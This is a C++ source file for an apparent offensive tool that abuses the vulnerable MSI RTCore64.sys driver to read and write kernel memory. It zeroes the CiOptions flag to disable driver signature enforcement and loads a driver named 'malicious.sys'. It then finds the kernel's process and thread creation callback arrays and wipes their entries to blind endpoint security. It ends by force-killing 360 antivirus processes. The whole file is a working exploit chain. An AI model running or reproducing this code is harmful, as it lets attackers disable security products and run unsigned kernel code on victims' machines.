#include "global.h"
#include <aclapi.h>
#include <Psapi.h>
#include <iostream>

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif


struct RTCORE64_MSR_READ
{
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ
{
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE
{
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;


DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address)
{
    RTCORE64_MEMORY_READ MemoryRead {};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device, RTCORE64_MEMORY_READ_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead),
                    &BytesReturned, nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value)
{
    RTCORE64_MEMORY_READ MemoryRead {};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device, RTCORE64_MEMORY_WRITE_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead),
                    &BytesReturned, nullptr);
}


DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address)
{
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address)
{
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value)
{
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


void Log(const char* Message, ...)
{
    const auto file = stderr;

    va_list Args;
    va_start(Args, Message);
    std::vfprintf(file, Message, Args);
    std::fputc('\n', file);
    va_end(Args);
}

DWORD64 Findkrnlbase()
{
    DWORD cbNeeded = 0;
    LPVOID drivers[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
    {
        return (DWORD64)drivers[0];
    }

    return NULL;
}

BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle)
{
    BOOL status = FALSE;
    DWORD dwSizeNeeded;
    PSECURITY_DESCRIPTOR oldSd, newSd;
    SECURITY_DESCRIPTOR dummySdForXP;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    EXPLICIT_ACCESS ForEveryOne = {SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE |
                                       SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP |
                                       SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
                                   SET_ACCESS,
                                   NO_INHERITANCE,
                                   {NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}};
    if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) &&
        (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
    {
        if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded))
        {
            if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded))
            {
                if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0,
                                             (PSID*)&ForEveryOne.Trustee.ptstrName))
                {
                    if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) ==
                        ERROR_SUCCESS)
                    {
                        status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
                        LocalFree(newSd);
                    }
                    FreeSid(ForEveryOne.Trustee.ptstrName);
                }
            }
            LocalFree(oldSd);
        }
    }
    return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType,
                      BOOL startIt)
{
    BOOL status = FALSE;
    SC_HANDLE hSC = NULL, hS = NULL;

    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
    {
        if (hS = OpenService(hSC, serviceName, SERVICE_START))
        {
            wprintf(L"[+] \'%s\' service already registered\n", serviceName);
        }
        else
        {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
            {
                wprintf(L"[*] \'%s\' service not present\n", serviceName);
                if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType,
                                       startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL))
                {
                    wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
                    if (status = kull_m_service_addWorldToSD(hS))
                        wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
                    else
                        printf("kull_m_service_addWorldToSD");
                }
                else
                    PRINT_ERROR_AUTO(L"CreateService");
            }
            else
                PRINT_ERROR_AUTO(L"OpenService");
        }
        if (hS)
        {
            if (startIt)
            {
                if (status = StartService(hS, 0, NULL))
                    wprintf(L"[+] \'%s\' service started\n", serviceName);
                else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                    wprintf(L"[*] \'%s\' service already started\n", serviceName);
                else
                {
                    PRINT_ERROR_AUTO(L"StartService");
                }
            }
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    else
    {
        PRINT_ERROR_AUTO(L"OpenSCManager(create)");
        return GetLastError();
    }
    return 0;
}


void FindDriver(DWORD64 address)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    DWORD64 diff[3][200];
    TCHAR szDriver[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        int n = sizeof(drivers) / sizeof(drivers[0]);
        cDrivers = cbNeeded / sizeof(drivers[0]);
        int narrow = 0;
        int c = 0;
        for (i = 0; i < cDrivers; i++)
        {
            // we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
            if (address > (DWORD64)drivers[i])
            {
                diff[0][c] = address;
                diff[1][c] = address - (DWORD64)drivers[i];
                diff[2][c] = (DWORD64)drivers[i];
                c++;
            }
        }
    }
    // cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
    int k = 0;
    DWORD64 temp = diff[1][0];
    for (k = 0; k < cDrivers; k++)
    {
        if ((temp > diff[1][k]) && (diff[0][k] == address))
        {
            temp = diff[1][k];
        }
    }

    if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver)))
    {
        std::cout << "[+] " << std::hex << address << " [";
        std::wcout << szDriver << " + 0x";
        std::cout << std::hex << (int)temp;
        std::cout << "]" << std::endl;
    }
    else
    {
        Log("[+] Could not resolve driver for %p", address);
    }
}

struct Offsets
{
    DWORD64 process;
    DWORD64 image;
    DWORD64 thread;
    DWORD64 registry;
};

struct Offsets getVersionOffsets()
{
    wchar_t value[255] = {0x00};
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL,
                &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    switch (winVer)
    {
        case 1909:
            return {0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48};
        case 2004:
            return {0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48};
        default:
            wprintf(L"[!] Version Offsets Not Found!\n");
    }
}

HANDLE GetDriverHandle()
{
    HANDLE Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE)
    {
        Log("[!] Unable to obtain a handle to the device object");
        return Device;
        exit;
    }
    else
    {
        Log("[+] Device object handle obtained: %p", Device);
        return Device;
    }
}

DWORD64 GetFunctionAddress(LPCSTR function)
{
    DWORD64 Ntoskrnlbaseaddress = Findkrnlbase();
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    DWORD64 Offset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, function)) - reinterpret_cast<DWORD64>(Ntoskrnl);
    DWORD64 address = Ntoskrnlbaseaddress + Offset;
    FreeLibrary(Ntoskrnl);
    Log("[+] %s address: %p", function, address);
    return address;
}

DWORD64 PatternSearch(HANDLE Device, DWORD64 start, DWORD64 end, DWORD64 pattern)
{
    // searches for a pattern of instructions known to be close to the target array in memory, returns the address. Calling
    // function then does some calculations based on the returned value.
    int range = end - start;

    for (int i = 0; i < range; i++)
    {
        DWORD64 contents = ReadMemoryDWORD64(Device, start + i);
        if (contents == pattern)
        {
            return start + i;
        }
    }
}


void findthreadcallbackroutine()
{
    Offsets offsets = getVersionOffsets();
    const auto Device = GetDriverHandle();

    const DWORD64 PsRemoveCreateThreadNotifyRoutine = GetFunctionAddress("PsRemoveCreateThreadNotifyRoutine");
    const DWORD64 PsRemoveLoadImageNotifyRoutine = GetFunctionAddress("PsRemoveLoadImageNotifyRoutine");

    DWORD64 patternaddress =
        PatternSearch(Device, PsRemoveCreateThreadNotifyRoutine, PsRemoveLoadImageNotifyRoutine, offsets.thread);
    DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x4);
    DWORD64 PspCreateThreadNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress) + offset);
    Log("[+] PspCreateThreadNotifyRoutineAddress: %p", PspCreateThreadNotifyRoutineAddress);
    Log("[+] Enumerating thread creation callbacks");
    int i = 0;
    for (i; i < 64; i++)
    {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8));
        if (callback != NULL)
        {                                                   // only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);    // shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
            FindDriver(cbFunction);
            Log("Removing callback to %p at address %p", cbFunction, PspCreateThreadNotifyRoutineAddress + (i * 8));
            WriteMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8), 0x0000000000000000);
        }
    }
}


void findprocesscallbackroutine()
{
    // we search the memory between pssetcreateprocessnotifyroutine and iocreatedriver for a specific set of instructions
    // next to a relative LEA containing the offset to the PspCreateProcessNotifyRoutine array of callbacks.
    Offsets offsets = getVersionOffsets();
    const auto Device = GetDriverHandle();
    const DWORD64 PsSetCreateProcessNotifyRoutineAddress = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");
    const DWORD64 IoCreateDriverAddress = GetFunctionAddress("IoCreateDriver");
    // the address returned by the patternsearch is just below the offsets.
    DWORD64 patternaddress =
        PatternSearch(Device, PsSetCreateProcessNotifyRoutineAddress, IoCreateDriverAddress, offsets.process);
    DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x0c);
    // so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right,
    // shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
    DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress) + offset) - 8;

    Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
    Log("[+] Enumerating process creation callbacks");
    int i = 0;
    for (i; i < 64; i++)
    {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspCreateProcessNotifyRoutineAddress + (i * 8));
        if (callback != NULL)
        {                                                   // only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);    // shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);
            FindDriver(cbFunction);
            WriteMemoryDWORD64(Device, PspCreateProcessNotifyRoutineAddress + (i * 8), 0x0000000000000000);
        }
    }
}


int main(int argc, char* argv[])
{
    const auto svcName = L"RTCore64";
    const auto svcName2 = L"malicious";
    const auto svcDesc = L"Micro-Star MSI Afterburner";
    const auto svcDesc2 = L"malicious";
    const wchar_t driverName[] = L"\\RTCore64.sys";
    const wchar_t driverName2[] = L"\\malicious.sys";
    const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
    const auto pathSize2 = MAX_PATH + sizeof(driverName2) / sizeof(wchar_t);
    TCHAR driverPath[pathSize];
    TCHAR driverPath2[pathSize2];
    GetCurrentDirectory(pathSize, driverPath);
    wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));

    GetCurrentDirectory(pathSize2, driverPath2);
    wcsncat_s(driverPath2, driverName2, sizeof(driverName2) / sizeof(wchar_t));
    service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);

    PVOID CiOptionsAddress;
    NTSTATUS Status = AnalyzeCi(&CiOptionsAddress);
    printf("%llx\n", CiOptionsAddress);
    HANDLE device = GetDriverHandle();
    WriteMemoryPrimitive(device, 1, (DWORD64)CiOptionsAddress, 0);

    service_install(svcName2, svcDesc2, driverPath2, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);

    findprocesscallbackroutine();
    findthreadcallbackroutine();

    system("taskkill /IM QHActiveDefense.exe /F");
    system("taskkill /IM QHSafeTray.exe /F");
    system("taskkill /IM QHWatchdog.exe /F");
    system("taskkill /IM QHSafeMain.exe /F");
    system("taskkill /IM PromoUtil.exe /F");

    return 0;
}
